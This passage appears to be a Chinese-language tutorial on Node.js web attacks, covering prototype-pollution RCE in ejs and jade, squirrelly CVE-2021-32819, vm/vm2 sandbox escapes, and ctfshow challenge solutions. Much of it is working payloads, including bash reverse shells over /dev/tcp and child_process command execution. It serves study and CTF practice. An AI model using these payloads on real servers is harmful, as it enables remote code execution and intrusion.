    //对原型进行污染
    var malicious_payload = '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"}}';
    _.merge({}, JSON.parse(malicious_payload));
    //进行渲染
    app.get('/', function (req, res) {
        res.render ("./test.ejs",{
            message: 'lufei test '
        });
    });
    //设置http
    var server = app.listen(8081, function () {
        var host = server.address().address
        var port = server.address().port
        console.log("应用实例，访问地址为 http://%s:%s", host, port)
    });
test.ejs
payload：
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/6666 0>&1\"');var __tmp2"}}
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"}}
##### **例二**
    router.post('/', require('body-parser').json(),function(req, res, next) {
      res.type('html');
      var user = new function(){
        this.userinfo = new function(){
        this.isVIP = false;
        this.isAdmin = false;    
        };
      };
      utils.copy(user.userinfo,req.body);
      if(user.userinfo.isAdmin){
        return res.json({ret_code: 0, ret_msg: 'login success!'});  
      }else{
        return res.json({ret_code: 2, ret_msg: 'login fail!'});  
      }
    });
**_payload1_** ：覆盖 `opts.outputFunctionName` , 这样构造的payload就会被拼接进js语句中，并在 ejs
渲染时进行 RCE。
    {"__proto__":{"__proto__":{"outputFunctionName":"a=1; return global.process.mainModule.constructor._load('child_process').execSync('dir'); //"}}}
    {"__proto__":{"__proto__":{"outputFunctionName":"__tmp1; return global.process.mainModule.constructor._load('child_process').execSync('dir'); __tmp2"}}}
**_payload2_** ：伪造 `opts.escapeFunction` 也可以进行 RCE
    {"__proto__":{"__proto__":{"client":true,"escapeFunction":"1; return global.process.mainModule.constructor._load('child_process').execSync('dir');"}}}
**补充:** 在 ejs 模板中还有三个可控的参数, 分别为 `opts.localsName` 和 `opts.destructuredLocals`
和 `opts.filename`, 但是这三个无法构建出合适的污染链。
### jade
compileDebug的伪造
给出上面题目的payload，可参考着看。
    {"__proto__":{"compileDebug":1,"self":1,"line":"console.log(global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/xxx/1234 0>&1\"'))"}}
    {"__proto__":{"__proto__": {"type":"Code","compileDebug":true,"self":true,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('dir');//"}}}
### squirrelly
**_CVE-2021-32819_**
server.js
    const express = require('express')
    const squirrelly = require('squirrelly')
    const app = express()
    app.set('views', __dirname);
    app.set('view engine', 'squirrelly')
    app.use(express.urlencoded({ extended: false }));
    app.get('/', (req, res) => {
       res.render('index.squirrelly', req.query)
    })
    var server = app.listen(3000, '0.0.0.0', function () {
        var host = server.address().address
        var port = server.address().port
        console.log("Listening on http://%s:%s", host, port)
    });
index.squirrelly
            CVE-2021-32819
            Test For CVE-2021-32819
        {{it.variable}}
payload
    /?defaultFilter=e')); let require = global.require || global.process.mainModule.constructor._load; require('child_process').exec('dir'); //
PS:以下贴出几篇文章，师傅们可以跟进分析：
[几个node模板引擎的原型链污染分析](https://lonmar.cn/2021/02/22/几个node模板引擎的原型链污染分析/)
# VM沙箱逃逸
### vm模块
vm 模块创建一个V8虚拟引擎 context（上下文、环境）来编译和运行代码。调用代码与被调用代码处于不同的 context，意味着它们的 global
对象是不同的。
    const vm = require('vm');
    // global下定义一个 x 变量
    const x = 1;
    // context也定义一个 x 变量
    const context = { x: 2 };
    vm.createContext(context);          // 语境化 {x:2}
    // code包含的代码将在 context 下执行，所以其中所有代码访问的变量都是 context 下的
    const code = 'x += 40; var y = 17;';
    vm.runInContext(code, context);
    // context = {x:42, y:17}
    console.log(context.x); // 42
    console.log(context.y); // 17
    // global没有被改动
    console.log(x); // 1; y is not defined.
### 逃逸
当使用vm创建一个context时，不能访问golbal对象，但是我们可以利用对象带有的constructor属性逃逸。
    const vm = require("vm");
    const env = vm.runInNewContext("this.constructor.constructor('return this.process.env')()");
    console.log(env);
第一次调constructor得到Object Contrustor，第二次调constructor得到Function
Contrustor，就是一个构造函数了。这里构造的函数内的语句为return this.process.env，那么控制process之后就能RCE了。
    const vm = require("vm");
    const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
    process.mainModule.require('child_process').execSync('dir').toString()`);
    console.log(xyz);
### vm2
    var handler = {
        get () {
         console.log("get");
        }
      };
    var target = {};
    var proxy = new Proxy(target, handler);
    Object.prototype.has = function(t, k){
        console.log("has");
    }
    proxy.a; //触发get
    "" in proxy; //触发has，这个has是在原型链上定义的w
    "use strict";
    var process;
    Object.prototype.has = function (t, k) {
        process = t.constructor("return process")();
    };
    "" in Buffer.from;
    process.mainModule.require("child_process").execSync("whoami").toString()
关于vm2的逃逸这里不过多赘述，师傅们可以自行参考。
# 利用
### 大小写特性
题目来源于ctfhsow-web-334。
user.js
    module.exports = {
      items: [
        {username: 'CTFSHOW', password: '123456'}
      ]
    };
login.js
    var express = require('express');
    var router = express.Router();
    var users = require('../modules/user').items;
    var findUser = function(name, password){
      return users.find(function(item){
        return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
      });
    };
    /* GET home page. */
    router.post('/', function(req, res, next) {
      res.type('html');
      var flag='flag_here';
      var sess = req.session;
      var user = findUser(req.body.username, req.body.password);
      if(user){
        req.session.regenerate(function(err) {
          if(err){
            return res.json({ret_code: 2, ret_msg: '登录失败'});        
          }
          req.session.loginUser = user.username;
          res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
        });
      }else{
        res.json({ret_code: 1, ret_msg: '账号或密码错误'});
      }  
    });
    module.exports = router;
发现`name!=='CTFSHOW' && item.username === name.toUpperCase()`，上面有说过转大写时`ſ =>>
S`
这里直接用ctfſhow 123456登录就可以出flag了。
### RCE
题目来源于ctfhsow-web-335。
        CTFFSHOW
        where is flag?  
直接利用eval读取目录文件。
    /?eval=res.end(require('fs').readdirSync('.').toString())
    /?eval=res.end(require('fs').readFileSync('./fl00g.txt').toString());
或者
    require( 'child_process' ).spawnSync( 'ls', [ '/' ] ).stdout.toString()
    require( 'child_process' ).spawnSync( 'cat', [ 'f*' ] ).stdout.toString()
### 变量拼接/弱类型
题目来源于ctfhsow-web-337。
    var express = require('express');
    var router = express.Router();
    var crypto = require('crypto');
    function md5(s) {
      return crypto.createHash('md5')
        .update(s)
        .digest('hex');
    }
    /* GET home page. */
    router.get('/', function(req, res, next) {
      res.type('html');
      var flag='xxxxxxx';
      var a = req.query.a;
      var b = req.query.b;
      if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
        res.end(flag);
      }else{
        res.render('index',{ msg: 'tql'});
      }
    });
    module.exports = router;
为了突出特性，不利用`/?a[]=1&b=1`。
    a={'x':'1'}
    b={'x':'2'}
    console.log(a+"flag{xxx}")
    console.log(b+"flag{xxx}")
我们发现一个对象与字符串相加，输出不会有对象内容。
    /?a[x]=1&b[x]=2
### 其他
    router.get('/', function(req, res, next) {
      res.type('html');
      var flag = 'flag_here';
      if(req.url.match(/8c|2c|\,/ig)){
        res.end('where is flag :)');
      }
      var query = JSON.parse(req.query.query);
      if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
        res.end(flag);
      }else{
        res.end('where is flag. :)');
      }
    });
8c，2c，逗号都被过滤了。`urlencode(",") = %2c` 发现 `2c` 也被过滤。